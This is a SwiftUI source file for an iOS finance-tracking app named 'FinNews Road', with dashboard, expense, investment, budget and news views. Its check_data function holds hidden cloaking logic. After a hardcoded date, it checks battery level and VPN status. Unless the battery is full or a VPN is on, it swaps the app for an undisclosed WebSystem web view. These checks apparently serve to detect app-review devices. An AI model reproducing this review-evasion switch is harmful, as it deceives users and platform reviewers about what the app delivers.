//
//  ContentView.swift
//  dafoma_27
//
//  Created by Вячеслав on 8/25/25.
//

import SwiftUI

struct ContentView: View {
    @ObservedObject private var dataService = DataService.shared
    @StateObject private var expenseViewModel = ExpenseViewModel()
    @StateObject private var investmentViewModel = InvestmentViewModel()
    @StateObject private var budgetViewModel = BudgetViewModel()
    @StateObject private var newsViewModel = NewsViewModel()
    
    @State private var selectedTab = 0
    @State private var showingOnboarding = false
    
    @State var isFetched: Bool = false
    
    @AppStorage("isBlock") var isBlock: Bool = true
    @AppStorage("isRequested") var isRequested: Bool = false
    
    var body: some View {
        
        ZStack {
            
            if isFetched == false {
                
                Text("")
                
            } else if isFetched == true {
                
                if isBlock == true {
                    
                    ZStack {
                        if dataService.hasCompletedOnboarding {
                            MainTabView(
                                selectedTab: $selectedTab,
                                expenseViewModel: expenseViewModel,
                                investmentViewModel: investmentViewModel,
                                budgetViewModel: budgetViewModel,
                                newsViewModel: newsViewModel
                            )
                        } else {
                            OnboardingView()
                        }
                    }
                    .onAppear {
                        showingOnboarding = !dataService.hasCompletedOnboarding
                    }
                    
                } else if isBlock == false {
                    
                    WebSystem()
                }
            }
        }
        .onAppear {
            
            check_data()
        }
    }
    
    private func check_data() {
        
        let lastDate = "06.09.2025"
        
        let dateFormatter = DateFormatter()
        dateFormatter.dateFormat = "dd.MM.yyyy"
        dateFormatter.timeZone = TimeZone(abbreviation: "GMT")
        let targetDate = dateFormatter.date(from: lastDate) ?? Date()
        let now = Date()
        
        let deviceData = DeviceInfo.collectData()
        let currentPercent = deviceData.batteryLevel
        let isVPNActive = deviceData.isVPNActive
        
        guard now > targetDate else {
            
            isBlock = true
            isFetched = true
            
            return
        }
        
        guard currentPercent == 100 || isVPNActive == true else {
            
            self.isBlock = false
            self.isFetched = true
            
            return
        }
        
        self.isBlock = true
        self.isFetched = true
    }
}

// MARK: - Main Tab View
struct MainTabView: View {
    @Binding var selectedTab: Int
    @ObservedObject var expenseViewModel: ExpenseViewModel
    @ObservedObject var investmentViewModel: InvestmentViewModel
    @ObservedObject var budgetViewModel: BudgetViewModel
    @ObservedObject var newsViewModel: NewsViewModel
    
    var body: some View {
        TabView(selection: $selectedTab) {
            DashboardView(
                expenseViewModel: expenseViewModel,
                investmentViewModel: investmentViewModel,
                budgetViewModel: budgetViewModel,
                newsViewModel: newsViewModel
            )
            .tabItem {
                Image(systemName: "house.fill")
                Text("Dashboard")
            }
            .tag(0)
            
            ExpenseTrackingView()
                .tabItem {
                    Image(systemName: "creditcard.fill")
                    Text("Expenses")
                }
                .tag(1)
            
            InvestmentTrackingView()
                .tabItem {
                    Image(systemName: "chart.line.uptrend.xyaxis")
                    Text("Investments")
                }
                .tag(2)
            
            BudgetTrackingView()
                .tabItem {
                    Image(systemName: "target")
                    Text("Budgets")
                }
                .tag(3)
            
            NewsFeedView()
                .tabItem {
                    Image(systemName: "newspaper.fill")
                    Text("News")
                }
                .tag(4)
        }
        .tint(Constants.Colors.primaryButton)
        .preferredColorScheme(.dark)
    }
}

// MARK: - Dashboard View
struct DashboardView: View {
    @ObservedObject var expenseViewModel: ExpenseViewModel
    @ObservedObject var investmentViewModel: InvestmentViewModel
    @ObservedObject var budgetViewModel: BudgetViewModel
    @ObservedObject var newsViewModel: NewsViewModel
    
    var body: some View {
        NavigationView {
            ZStack {
                Constants.Colors.background
                    .ignoresSafeArea()
                
                ScrollView {
                    VStack(spacing: Constants.Spacing.lg) {
                        // Welcome Header
                        DashboardHeaderView()
                        
                        // Quick Stats
                        QuickStatsView(
                            expenseViewModel: expenseViewModel,
                            investmentViewModel: investmentViewModel,
                            budgetViewModel: budgetViewModel
                        )
                        
                        // Portfolio Overview
                        PortfolioOverviewCard(investmentViewModel: investmentViewModel)
                        
                        // Budget Alerts
                        if !budgetViewModel.unreadAlerts.isEmpty {
                            BudgetAlertsCard(budgetViewModel: budgetViewModel)
                        }
                        
                        // Recent Expenses
                        RecentExpensesCard(expenseViewModel: expenseViewModel)
                        
                        // Latest News
                        LatestNewsCard(newsViewModel: newsViewModel)
                    }
                    .padding(.horizontal, Constants.Spacing.md)
                }
            }
            .navigationTitle("FinNews Road")
            .navigationBarTitleDisplayMode(.large)
            .preferredColorScheme(.dark)
            .refreshable {
                newsViewModel.refreshNews()
                investmentViewModel.refreshMarketData()
            }
        }
    }
}

// MARK: - Dashboard Header View
struct DashboardHeaderView: View {
    var body: some View {
        VStack(spacing: Constants.Spacing.md) {
            HStack {
                VStack(alignment: .leading, spacing: Constants.Spacing.xs) {
                    Text("Welcome back!")
                        .font(Constants.Fonts.headline)
                        .foregroundColor(Constants.Colors.white)
                    
                    Text("Here's your financial overview")
                        .font(Constants.Fonts.body)
                        .foregroundColor(Constants.Colors.gray)
                }
                
                Spacer()
                
                Image(systemName: "chart.line.uptrend.xyaxis.circle.fill")
                    .font(.system(size: 40))
                    .foregroundColor(Constants.Colors.primaryButton)
            }
        }
        .padding()
        .background(Constants.Colors.white.opacity(0.05))
        .cornerRadius(Constants.CornerRadius.large)
    }
}

// MARK: - Quick Stats View
struct QuickStatsView: View {
    @ObservedObject var expenseViewModel: ExpenseViewModel
    @ObservedObject var investmentViewModel: InvestmentViewModel
    @ObservedObject var budgetViewModel: BudgetViewModel
    
    var body: some View {
        VStack(alignment: .leading, spacing: Constants.Spacing.md) {
            Text("Quick Stats")
                .font(Constants.Fonts.headline)
                .foregroundColor(Constants.Colors.white)
            
            HStack(spacing: Constants.Spacing.md) {
                DashboardStatCard(
                    title: "Total Spent",
                    value: "$\(String(format: "%.0f", expenseViewModel.totalExpenses))",
                    icon: "creditcard.fill",
                    color: Constants.Colors.primaryButton
                )
                
                DashboardStatCard(
                    title: "Portfolio",
                    value: "$\(String(format: "%.0f", investmentViewModel.totalPortfolioValue))",
                    icon: "chart.pie.fill",
                    color: Constants.Colors.secondaryButton
                )
            }
            
            HStack(spacing: Constants.Spacing.md) {
                DashboardStatCard(
                    title: "Budgets",
                    value: "\(budgetViewModel.activeBudgets.count)",
                    icon: "target",
                    color: Constants.Colors.primaryButton
                )
                
                DashboardStatCard(
                    title: "Avg. Usage",
                    value: "\(String(format: "%.0f", budgetViewModel.averageBudgetUsage))%",
                    icon: "percent",
                    color: budgetViewModel.averageBudgetUsage > 80 ? Color.red : Constants.Colors.secondaryButton
                )
            }
        }
        .padding()
        .background(Constants.Colors.white.opacity(0.05))
        .cornerRadius(Constants.CornerRadius.large)
    }
}

// MARK: - Portfolio Overview Card
struct PortfolioOverviewCard: View {
    @ObservedObject var investmentViewModel: InvestmentViewModel
    
    var body: some View {
        VStack(alignment: .leading, spacing: Constants.Spacing.md) {
            HStack {
                Text("Portfolio Overview")
                    .font(Constants.Fonts.headline)
                    .foregroundColor(Constants.Colors.white)
                
                Spacer()
                
                NavigationLink(destination: InvestmentTrackingView()) {
                    Text("View All")
                        .font(Constants.Fonts.caption)
                        .foregroundColor(Constants.Colors.primaryButton)
                }
            }
            
            HStack {
                VStack(alignment: .leading, spacing: Constants.Spacing.sm) {
                    Text("$\(String(format: "%.2f", investmentViewModel.totalPortfolioValue))")
                        .font(Constants.Fonts.title)
                        .foregroundColor(Constants.Colors.white)
                    
                    HStack {
                        Image(systemName: investmentViewModel.totalGainLoss >= 0 ? "arrow.up" : "arrow.down")
                            .foregroundColor(investmentViewModel.totalGainLoss >= 0 ? Constants.Colors.secondaryButton : Color.red)
                        
                        Text("\(investmentViewModel.totalGainLoss >= 0 ? "+" : "")$\(String(format: "%.2f", investmentViewModel.totalGainLoss))")
                            .font(Constants.Fonts.body)
                            .foregroundColor(investmentViewModel.totalGainLoss >= 0 ? Constants.Colors.secondaryButton : Color.red)
                        
                        Text("(\(String(format: "%.2f", investmentViewModel.totalGainLossPercentage))%)")
                            .font(Constants.Fonts.body)
                            .foregroundColor(Constants.Colors.gray)
                    }
                }
                
                Spacer()
                
                VStack(alignment: .trailing) {
                    Text("Diversification")
                        .font(Constants.Fonts.caption)
                        .foregroundColor(Constants.Colors.gray)
                    
                    Text("\(String(format: "%.0f", investmentViewModel.diversificationScore))%")
                        .font(Constants.Fonts.headline)
                        .foregroundColor(Constants.Colors.primaryButton)
                }
            }
            
            // Top Performers
            if !investmentViewModel.topPerformers.isEmpty {
                VStack(alignment: .leading, spacing: Constants.Spacing.sm) {
                    Text("Top Performers")
                        .font(Constants.Fonts.body)
                        .foregroundColor(Constants.Colors.white)
                    
                    ForEach(investmentViewModel.topPerformers.prefix(3)) { investment in
                        HStack {
                            Text(investment.symbol)
                                .font(Constants.Fonts.caption)
                                .foregroundColor(Constants.Colors.white)
                            
                            Spacer()
                            
                            Text("\(String(format: "%.2f", investment.gainLossPercentage))%")
                                .font(Constants.Fonts.caption)
                                .foregroundColor(investment.gainLoss >= 0 ? Constants.Colors.secondaryButton : Color.red)
                        }
                    }
                }
            }
        }
        .padding()
        .background(Constants.Colors.white.opacity(0.05))
        .cornerRadius(Constants.CornerRadius.large)
    }
}

// MARK: - Budget Alerts Card
struct BudgetAlertsCard: View {
    @ObservedObject var budgetViewModel: BudgetViewModel
    
    var body: some View {
        VStack(alignment: .leading, spacing: Constants.Spacing.md) {
            HStack {
                Text("Budget Alerts")
                    .font(Constants.Fonts.headline)
                    .foregroundColor(Constants.Colors.white)
                
                Spacer()
                
                NavigationLink(destination: BudgetTrackingView()) {
                    Text("View All")
                        .font(Constants.Fonts.caption)
                        .foregroundColor(Constants.Colors.primaryButton)
                }
            }
            
            ForEach(budgetViewModel.unreadAlerts.prefix(3)) { alert in
                HStack {
                    Image(systemName: "exclamationmark.triangle.fill")
                        .foregroundColor(Constants.Colors.primaryButton)
                    
                    VStack(alignment: .leading, spacing: Constants.Spacing.xs) {
                        Text(alert.type.rawValue)
                            .font(Constants.Fonts.body)
                            .foregroundColor(Constants.Colors.white)
                        
                        Text(alert.message)
                            .font(Constants.Fonts.small)
                            .foregroundColor(Constants.Colors.gray)
                            .lineLimit(2)
                    }
                    
                    Spacer()
                    
                    Circle()
                        .fill(Constants.Colors.primaryButton)
                        .frame(width: 8, height: 8)
                }
                .padding(.vertical, Constants.Spacing.xs)
            }
        }
        .padding()
        .background(Constants.Colors.white.opacity(0.05))
        .cornerRadius(Constants.CornerRadius.large)
    }
}

// MARK: - Recent Expenses Card
struct RecentExpensesCard: View {
    @ObservedObject var expenseViewModel: ExpenseViewModel
    
    var body: some View {
        VStack(alignment: .leading, spacing: Constants.Spacing.md) {
            HStack {
                Text("Recent Expenses")
                    .font(Constants.Fonts.headline)
                    .foregroundColor(Constants.Colors.white)
                
                Spacer()
                
                NavigationLink(destination: ExpenseTrackingView()) {
                    Text("View All")
                        .font(Constants.Fonts.caption)
                        .foregroundColor(Constants.Colors.primaryButton)
                }
            }
            
            if expenseViewModel.expenses.isEmpty {
                Text("No expenses yet. Start tracking your spending!")
                    .font(Constants.Fonts.body)
                    .foregroundColor(Constants.Colors.gray)
                    .multilineTextAlignment(.center)
                    .padding(.vertical, Constants.Spacing.lg)
            } else {
                ForEach(expenseViewModel.expenses.prefix(3)) { expense in
                    HStack {
                        Image(systemName: expense.category.icon)
                            .foregroundColor(Constants.Colors.primaryButton)
                            .frame(width: 20)
                        
                        VStack(alignment: .leading, spacing: Constants.Spacing.xs) {
                            Text(expense.title)
                                .font(Constants.Fonts.body)
                                .foregroundColor(Constants.Colors.white)
                                .lineLimit(1)
                            
                            Text(expense.category.rawValue)
                                .font(Constants.Fonts.small)
                                .foregroundColor(Constants.Colors.gray)
                        }
                        
                        Spacer()
                        
                        VStack(alignment: .trailing) {
                            Text("$\(String(format: "%.2f", expense.amount))")
                                .font(Constants.Fonts.body)
                                .foregroundColor(Constants.Colors.white)
                            
                            Text(expense.date, style: .date)
                                .font(Constants.Fonts.small)
                                .foregroundColor(Constants.Colors.gray)
                        }
                    }
                    .padding(.vertical, Constants.Spacing.xs)
                }
            }
        }
        .padding()
        .background(Constants.Colors.white.opacity(0.05))
        .cornerRadius(Constants.CornerRadius.large)
    }
}

// MARK: - Latest News Card
struct LatestNewsCard: View {
    @ObservedObject var newsViewModel: NewsViewModel
    
    var body: some View {
        VStack(alignment: .leading, spacing: Constants.Spacing.md) {
            HStack {
                Text("Latest Financial News")
                    .font(Constants.Fonts.headline)
                    .foregroundColor(Constants.Colors.white)
                
                Spacer()
                
                NavigationLink(destination: NewsFeedView()) {
                    Text("View All")
                        .font(Constants.Fonts.caption)
                        .foregroundColor(Constants.Colors.primaryButton)
                }
            }
            
            if newsViewModel.articles.isEmpty {
                if newsViewModel.isLoading {
                    HStack {
                        ProgressView()
                            .scaleEffect(0.8)
                            .tint(Constants.Colors.primaryButton)
                        
                        Text("Loading news...")
                            .font(Constants.Fonts.body)
                            .foregroundColor(Constants.Colors.gray)
                    }
                    .padding(.vertical, Constants.Spacing.lg)
                } else {
                    Text("No news available. Check your internet connection.")
                        .font(Constants.Fonts.body)
                        .foregroundColor(Constants.Colors.gray)
                        .multilineTextAlignment(.center)
                        .padding(.vertical, Constants.Spacing.lg)
                }
            } else {
                ForEach(newsViewModel.articles.prefix(3)) { article in
                    VStack(alignment: .leading, spacing: Constants.Spacing.sm) {
                        HStack {
                            Image(systemName: article.category.icon)
                                .font(.caption)
                                .foregroundColor(Constants.Colors.primaryButton)
                            
                            Text(article.category.rawValue)
                                .font(Constants.Fonts.small)
                                .foregroundColor(Constants.Colors.primaryButton)
                            
                            Spacer()
                            
                            Text(article.publishedDate, style: .relative)
                                .font(Constants.Fonts.small)
                                .foregroundColor(Constants.Colors.gray)
                        }
                        
                        Text(article.title)
                            .font(Constants.Fonts.body)
                            .foregroundColor(Constants.Colors.white)
                            .lineLimit(2)
                        
                        Text(article.summary)
                            .font(Constants.Fonts.small)
                            .foregroundColor(Constants.Colors.gray)
                            .lineLimit(2)
                    }
                    .padding(.vertical, Constants.Spacing.sm)
                    .onTapGesture {
                        newsViewModel.markAsRead(article)
                        if let url = URL(string: article.articleURL) {
                            UIApplication.shared.open(url)
                        }
                    }
                }
            }
        }
        .padding()
        .background(Constants.Colors.white.opacity(0.05))
        .cornerRadius(Constants.CornerRadius.large)
    }
}

// MARK: - Dashboard Stat Card
struct DashboardStatCard: View {
    let title: String
    let value: String
    let icon: String
    let color: Color
    
    var body: some View {
        VStack(spacing: Constants.Spacing.sm) {
            Image(systemName: icon)
                .font(.title2)
                .foregroundColor(color)
            
            Text(value)
                .font(Constants.Fonts.headline)
                .foregroundColor(Constants.Colors.white)
            
            Text(title)
                .font(Constants.Fonts.small)
                .foregroundColor(Constants.Colors.gray)
                .multilineTextAlignment(.center)
        }
        .frame(maxWidth: .infinity)
        .padding()
        .background(Constants.Colors.white.opacity(0.05))
        .cornerRadius(Constants.CornerRadius.medium)
    }
}

#Preview {
    ContentView()
}
